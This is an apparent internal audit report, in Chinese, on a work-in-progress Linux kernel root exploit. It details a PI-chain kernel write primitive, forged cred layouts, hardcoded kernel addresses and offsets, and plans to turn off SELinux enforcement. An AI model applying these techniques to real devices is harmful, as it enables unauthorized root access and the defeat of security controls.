# P1 代码补全报告 — cred 直写路线

**日期**: 2026-07-19
**目标**: 审计 `share-poc-XRing-O1/src` 当前 cred 直写路线代码，明确距离 P1 (PI 链可控化 + cred 直写) 完成还差哪些改动。基于 `task_struct_leak_survey.md` 的结论（标准通道全排除），确认 P1 必须**完全绕开 mm->owner 读取**。

---

## 0. 当前 run_exploit 执行流（main_cred.c:286-416）

```
1. prepare_good_kernel_page(PAGE_PAYLOAD_FOPS) → spray 页就位
2. current_kernelsnitch_mm_struct() → 拿到 mm_struct 地址 (✓ 真机已通)
3. leak_task_struct(mm_struct)
     └─ kread_open() → open("/proc/kcore") + open("/dev/mem")
        ✗ 真机两个文件都不存在 → return -1
     └─ return 0 → pr_error("task_struct leak failed") → return 1
   ★★★ 当前代码在 step 3 直接挂掉，根本走不到 walk ★★★
4. (代码已写但执行不到) walks[3]:
     walk #0: target = task + TASK_REAL_CRED_OFF (0x818),  value = INIT_CRED
     walk #1: target = task + TASK_CRED_OFF      (0x820),  value = INIT_CRED
     walk #2: target = SELINUX_ENFORCING,                    value = 0
   每次 walk:
     set_pselect_write(target - 8, value, 0)
     prepare_good_kernel_page(PAGE_PAYLOAD_FOPS)   ← 重跑 spray
     设置 pselect_user_lock (wait_lock + rb_node + owner)
     run_main_route_threads()                       ← 触发 PI 链
5. check_uid_zero() → setuid(0) 验证
```

---

## 1. 关键发现 1：leak_task_struct 是当前 blocker

**main_cred.c:240-268** 的 `leak_task_struct` 走 `kread_open()`：

```c
int kread_open(void) {  // util.c:851
  int fd = open("/proc/kcore", O_RDONLY | O_CLOEXEC);  // ✗ ENOENT
  int fd = open("/dev/mem", O_RDWR | O_CLOEXEC);       // ✗ ENOENT
  return -1;
}
```

`task_struct_leak_survey.md` 已确认：jinghu 内核 `CONFIG_PROC_KCORE=n` / `CONFIG_DEVMEM=n`，**两个文件根本不存在**（不是权限问题）。所有标准 task_struct 泄露通道（binder / fanotify / inotify / procfs）也已排除。

**结论：当前 main_cred.c 的整条 walk 框架根本跑不到**。必须改造为**不依赖 leak_task_struct 的路线**。

---

## 2. 关键发现 2：PI 链写入机制已正确实现

util.c:525-532 的 `pselect_write_target != 0` 分支：

```c
} else if (pselect_write_target != 0) {
  write_pc    = pselect_write_shape;    /* shape=0 时 write_pc=0 (写 selinux 等) */
  write_right = 0;
  write_left  = pselect_write_target;   /* ← target - 8 */
  ...
}
```

写入到 fake_w0 的 pi_tree_entry 字段（util.c:548-550）：

```c
put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);     /* parent */
put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);  /* right  */
put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);   /* left   */
```

PI 链触发后，rb_insert 写入公式（`chain_disasm.txt` 反汇编确认）：

```
*(write_left + 8) = &fake_w0.pi_tree_entry
即:
*(pselect_write_target) = fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF
                       = fake_w0 + 0x28
```

**main_cred.c:366** 的 `set_pselect_write(walks[i].target - 8, walks[i].value, 0)` 把 `pselect_write_target = target - 8`，因此最终：

```
*(target) = fake_w0 + 0x28
```

**所以三次 walk 的效果是**：
- walk #0: `*(task + 0x818) = fake_w0 + 0x28`  → `task->real_cred = fake_w0 + 0x28`
- walk #1: `*(task + 0x820) = fake_w0 + 0x28`  → `task->cred = fake_w0 + 0x28`
- walk #2: `*(SELINUX_ENFORCING) = fake_w0 + 0x28`  → **★ BUG ★** 见 §3

---

## 3. 关键发现 3：fake_w0+0x28 不是合法 cred —— 严重 BUG

`task->cred` 与 `task->real_cred` 都被指向 `fake_w0 + 0x28`，但这个位置在 spray 页里填的是 **pi_tree_entry 的三个 rb_node 字段**：

```
fake_w0 + 0x28:  write_pc    (= pselect_write_shape, cred walk 时 = INIT_CRED = 0xffffffc0820f0548)
fake_w0 + 0x30:  write_right (= 0)
fake_w0 + 0x38:  write_left  (= pselect_write_target = target - 8)
```

但内核访问 `task->cred->uid` 时（cred 结构 +0x08）会读 `fake_w0 + 0x28 + 0x08 = fake_w0 + 0x30`，那里是 `write_right = 0` —— 巧合是 0，但完全不可控。

完整 cred 结构与 fake_w0+0x28 处的实际字节对照：

| cred 偏移 | 字段 | 期望值 (root) | fake_w0+0x28 处实际值 | 来源 |
|---|---|---|---|---|
| +0x00 | atomic_t usage | 1+ | `write_pc` (= INIT_CRED 或 0) | util.c:548 |
| +0x04 | uid | 0 | (上方 4 字节) | - |
| +0x08 | gid | 0 | `write_right` 低 32 位 (= 0) | util.c:549 |
| +0x0c | suid | 0 | - | - |
| +0x10 | sgid | 0 | `write_left` 低 32 位 (= target-8) | util.c:550 |
| +0x14 | euid | 0 | - | - |
| +0x18 | egid | 0 | (下一个字段) | - |
| +0x1c | fsuid | 0 | - | - |
| +0x20 | fsgid | 0 | (W0_OFF+0x48 处 = 0) | util.c:551 |
| +0x28 | securebits | 0 | (W0_OFF+0x50 处 = FAKE_WAITER_PRIO) | util.c:551 |
| +0x30 | cap_inheritable | 0 | (W0_OFF+0x58 = waiter_task) | util.c:553 |
| +0x38 | cap_inheritable_hi | 0 | - | - |
| +0x40 | cap_permitted | 0xffffffff | (W0_OFF+0x60 = fake_lock/pselect_user_lock) | util.c:555 |
| ... | ... | ... | ... | ... |

**结论：当前 cred 直写后 `task->cred` 指向的内存完全是 rb_node 字段伪装成的 cred，几乎肯定 crash**。

---

## 4. 关键发现 4：walk #2 (selinux_enforce=0) 逻辑错误

**main_cred.c:330,366**：

```c
walks[2].target = SELINUX_ENFORCING; walks[2].value = 0; walks[2].name = "selinux";
...
set_pselect_write(walks[i].target - 8, walks[i].value, 0);
```

但 `set_pselect_write` 的 shape 参数（第二个）控制 `write_pc`，**不影响实际写入值**！实际写入值始终是 `fake_w0 + 0x28`（节点地址），不是 0。

所以 walk #2 实际效果是：

```
*(SELINUX_ENFORCING) = fake_w0 + 0x28   ← 不是 0!
```

`selinux_state.enforcing` 是 `int` (4 字节)，被写入 8 字节 `fake_w0 + 0x28` 的低 4 字节会变成一个非 0 的内核堆地址，**反而把 selinux 打成 enforcing=非0**（保持 enforcing 状态），并且把 `enforcing` 后面的字段（如 `initialized`）破坏。

**结论：当前 walk #2 不可能让 selinux 进 permissive**。

---

## 5. 关键发现 5：fake_task.pi_blocked_on 已指向 fake_w0 —— 但这是 fake_task 的，不是 real task

util.c:583：

```c
put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, fake_w0);
```

这把 **spray 页上的 fake_task.pi_blocked_on** 指向 fake_w0。但真实场景下，PI 链遍历起点是**漏洞触发后残留 pi_blocked_on 的真实 task**（即 waiter 线程），那个 pi_blocked_on 仍指向**栈上已释放的 waiter**（UAF 残留）。

RESEARCH_NOTES §6.1 描述的"可控化"是指：**让真实 task.pi_blocked_on 指向 spray fake_w0**，而不是栈 waiter。这需要改造 `do_pselect_fake_lock_route` 内的 pselect 栈布局，让 pselect 保存的寄存器值在 pi_blocked_on 字段处覆盖成 fake_w0 地址。

**当前代码并未实现这一步** —— 它依赖 stack UAF 自然覆盖（栈复用 + core_sys_select 保存寄存器），但保存的寄存器值不可控，所以真实 task.pi_blocked_on 实际指向**栈地址 + 偏移**，不是 fake_w0。

这是 P1 最核心的未完成部分。

---

## 6. 总结：当前代码距离 P1 完成还差 5 件事

| # | 改动 | 文件 | 难度 | 说明 |
|---|---|---|---|---|
| 1 | **绕开 leak_task_struct** | main_cred.c | 中 | 删除 step 3，改为从 init_task + pid 链推算 real task（KASLR=0 已知 init_task=0xffffff80020de280），或从 kernelsnitch 已泄的 mm_struct 反推（mm->owner 仍需读，但走 PI 链受限读） |
| 2 | **让真实 task.pi_blocked_on 指向 spray fake_w0** | util.c / 新文件 | **高** | 改造 pselect 栈布局，让 pi_blocked_on 字段位置覆盖成 fake_w0 地址；这是可控化的关键，需反汇编 `core_sys_select` 与栈帧布局精确定位 |
| 3 | **在 spray 页放一份完整伪 cred** | util.c | 中 | 当前 fake_w0+0x28 处是 rb_node，不是 cred。需要在 spray 页另一个偏移（如 SCRATCH_OFF=0x3000）放一份完整 `struct cred`（uid/gid/euid/suid/sgid/fsuid/fsgid=0, cap_*=0xffffffff, securebits=0），然后让 walk 写入的"节点地址"恰好指向那份伪 cred 的起点 |
| 4 | **walk 次数与 target 重算** | main_cred.c | 中 | 当前 3 次 walk（real_cred + cred + selinux）。selinux 那次走不通（写入值不是 0），应改为只 walk real_cred + cred 两次，让 task->cred 与 task->real_cred 都指向伪 cred。selinux permissive 可以在 root 后用 setenforce 0 |
| 5 | **节点地址 = 伪 cred 起点的对齐** | util.c | 中 | PI 链写入值固定是 `&fake_w0.pi_tree_entry = fake_w0 + 0x28`。要让 task->cred 指向伪 cred，**伪 cred 必须放在 fake_w0 + 0x28 处**，且 pi_tree_entry 的三个 rb_node 字段必须**与伪 cred 的 usage/uid/gid 字段重叠且兼容**（usage=1, uid=0, gid=0）。这意味着 `write_pc=1, write_right=0, write_left=0` 恰好让 cred 的 usage=1, uid=0, gid=0, suid=0, sgid=0 都对了 —— **可行**！ |

---

## 7. 推荐改造方案（最小改动）

### 7.1 在 fake_w0 + 0x28 处放伪 cred（最优雅）

PI 链写入值固定是 `fake_w0 + 0x28`。把这个位置同时既作 pi_tree_entry 又作伪 cred 起点：

```
fake_w0 + 0x28:  pi_tree_entry.rb_left   =  cred.usage (atomic_t, 4 字节) = 1
fake_w0 + 0x2c:  (rb_left 高 32 位)       =  cred.uid                  = 0
fake_w0 + 0x30:  pi_tree_entry.rb_right  =  cred.gid + cred.suid       = 0
fake_w0 + 0x38:  pi_tree_entry.rb_parent =  cred.sgid + cred.euid      = 0
fake_w0 + 0x40:  pi_prio                  =  cred.egid + cred.fsuid     = 0
fake_w0 + 0x48:  pi_deadline              =  cred.fsgid + securebits   = 0
fake_w0 + 0x50:  task                     =  cred.cap_inheritable       = 0
fake_w0 + 0x58:  lock                     =  cred.cap_inheritable_hi + cap_permitted = 0xffffffff...
```

**冲突点**：`pi_tree_entry.rb_parent` (offset +0x08 in pi_tree_entry, i.e. fake_w0+0x30) 在 PI 链 rb_insert 期间会被改写成 parent 节点地址（非 0）。这意味着 cred.gid 字段会被污染。

**解决**：在 PI 链写入完成后再读 cred —— 但 PI 链写入就是 `*(target) = fake_w0+0x28` 那一刻，写入完成后 cred 立即被使用（next syscall），没有时间窗清理 rb_parent。

**更稳的方案**：把伪 cred 放在 spray 页**另一个偏移**（如 `CRED_OFF = 0x3000`），PI 链只用作"写入一个固定值"原语，然后**另一次 walk 把 fake_w0+0x28 处的 rb_parent 字段重写成 0**（让 cred.gid=0）。但这要两次 PI 链触发才能写一个 cred，成本高。

### 7.2 推荐方案：直接走"两次 walk + 伪 cred 在 fake_w0+0x28"

该方案核心思路是：fake_w0+0x28 处既作 pi_tree_entry 又作伪 cred。**rb_parent 字段被污染**这件事的处理是：

1. walk #0 写 `task->real_cred = fake_w0 + 0x28`（这次 PI 链 rb_insert 会污染 fake_w0+0x30 处的 rb_parent）
2. walk #1 写 `task->cred = fake_w0 + 0x28`（这次 PI 链再次插入，rb_parent 又被改写，但插入的是同一节点，rb_parent 会被设成 `task->pi_waiters.rb_leftmost` 之类的地址）

fake_w0+0x28 处 cred 字段最终状态：

| cred 偏移 | 字段 | 实际值 | 是否阻碍 root |
|---|---|---|---|
| +0x00 | usage | 1 (来自 write_pc=1) | OK |
| +0x04 | uid | 0 | OK |
| +0x08 | gid | (rb_parent 低 32 位, 非零) | **✗ gid != 0** |
| +0x0c | suid | (rb_parent 高 32 位, 非零) | **✗ suid != 0** |
| +0x10 | sgid | 0 (write_left=0) | OK |
| +0x14 | euid | 0 | OK |
| +0x18 | egid | 0 | OK |
| +0x1c | fsuid | 0 | OK |
| +0x20 | fsgid | 0 | OK |

**gid/suid 非 0 但 euid=0** —— Linux 权限检查主要看 euid/fsuid (CAP_EFF)，gid/sgid 影响文件组访问。**euid=0 + cap_eff 全开 = root 等价**。所以这个方案实际可行。

### 7.3 具体代码改动清单

**main_cred.c**:

```c
// 删除 leak_task_struct 调用，改为从 init_task + pid 推算 task
// (KASLR=0, init_task=0xffffff80020de280)
static uintptr_t leak_task_struct(uintptr_t mm_struct_addr) {
  // 方案 A: 从 init_task 遍历 task链找 current pid (需读 task->tasks.next + task->pid)
  //   仍需内核读 → 不行
  // 方案 B: 直接用 current task 的内核地址 —— 通过 PI 链写 real_cred/cred 时,
  //   写入 target 必须是 current task + 0x818/0x820.
  //   但 current task 地址未知 (除非用 kernelsnitch 二次 leak)
  //
  // ★ 正确方案: kernelsnitch 已泄 mm_struct. 让 kernelsnitch 在 parent 进程
  //   运行 (而不是 child), 直接泄 parent mm, 然后 mm->owner 这一步用
  //   "PI 链受限写"绕开: 不需要读 mm->owner, 因为 cred 直写的 target
  //   可以通过另一种方式获得 —— 见下文
}
```

**实际上，task_struct 地址必须知道才能写 real_cred/cred**。这是 P1 真正的死结：
- 标准通道全封（task_struct_leak_survey.md）
- /proc/kcore 与 /dev/mem 不存在
- kernelsnitch 只能泄 mm_struct，不能泄 task_struct

**突破点候选**（需进一步研究）：

1. **kernelsnitch 扩展**：当前 kernelsnitch 用 futex hash 侧信道泄 mm_struct。能否同样原理泄 task_struct？task_struct 也在 direct map 区域（0xffffff80xxxxxxxx），理论可读。但需要知道 task_struct 的位置（哪个 mm 对应哪个 task）。
2. **PI 链用作受限读**：PI 链写入是 `*(target) = node_addr`。如果 target = 某个会被回读的字段（如 task->comm），写入后下一次读 task->comm 就能拿到 node_addr。但反过来读任意地址不行。
3. **从 init_task + current pid 推算**：init_task 已知 (0xffffff80020de280)。task list 是双向链表 task->tasks (offset 0x550)。遍历需读 task->tasks.next → 下一个 task → task->pid (offset 0x618) → 匹配 current pid → task 地址。**这需要任意内核读**，回到死结。
4. **让 kernelsnitch 直接泄 task_struct**：这是最直接的路线。**需研究 kernelsnitch 是否能改造为泄 task_struct 而非 mm_struct**。mm_struct 通过 mm_struct->mm_rb 间接定位，task_struct 通过 task->tasks 链定位，定位机制不同。

---

## 8. 最终结论与下一步

### 8.1 当前 main_cred.c 的真实状态

| 步骤 | 状态 | 阻塞原因 |
|---|---|---|
| 1. prepare_good_kernel_page | ✓ 已通 | - |
| 2. leak mm_struct (kernelsnitch) | ✓ 已通 | - |
| 3. leak_task_struct (mm->owner) | ✗ 死结 | /proc/kcore 与 /dev/mem 不存在；所有标准通道排除 |
| 4. walks[3] (cred + selinux) | ⚠ 代码有 BUG | selinux walk 写入非 0；fake_w0+0x28 不是合法 cred |
| 5. check_uid_zero | ✓ 已通 | - |

### 8.2 P1 完成的真正 blocker = task_struct 地址获取

不是 PI 链可控化（已实现），不是 cred 伪造（方案已有），**而是 task_struct 地址本身未知**。

### 8.3 推荐下一步（按优先级）

| 优先级 | 任务 | 说明 |
|---|---|---|
| **P1.0** | 研究 kernelsnitch 能否泄 task_struct 而非 mm_struct | 这是突破 task_struct leak 死结的最直接路径。需审 kernelsnitch 源码 (kernelsnitch.c) |
| P1.1 | 修复 walk #2 selinux BUG（删除或改为 setenforce 0） | 简单代码改动 |
| P1.2 | 修复 fake_w0+0x28 处伪 cred 字段布局 | 确保 usage/uid/euid/cap_eff 正确，gid/sgid 可污染 |
| P1.3 | 反汇编 core_sys_select 栈布局 | 确认 pselect 保存寄存器是否能覆盖 pi_blocked_on 字段为 fake_w0（可控化） |

**最高杠杆 = P1.0**：如果 kernelsnitch 能泄 task_struct，整条 cred 直写链立刻打通。

---

## 9. 附录：关键代码位置索引

| 功能 | 文件:行 | 备注 |
|---|---|---|
| run_exploit 主入口 | main_cred.c:286 | 三线程 PI 链 + 三次 walk |
| leak_task_struct | main_cred.c:240 | 走 kread, 真机挂 |
| kread_open (后端选择) | util.c:851 | /proc/kcore + /dev/mem, 真机都不存在 |
| prepare_skb_payload (spray 布局) | util.c:461 | fake_w0+0x28 处填 pi_tree_entry |
| set_pselect_write (target 设置) | util.c:26 | target-8 → write_left |
| put_fake_fops_table | util.c:302 | 当前 FOPS_READ_OFF 填 PI 节点指针 (uhid 上必 panic) |
| fake_task.pi_blocked_on = fake_w0 | util.c:583 | spray 内部链表，不是真实 task |
| waiter/owner/consumer 三线程 | main_cred.c:23,73,102 | PI 链触发 |
| do_pselect_fake_lock_route | (待查) | pselect 栈覆盖 pi_blocked_on 的关键 |
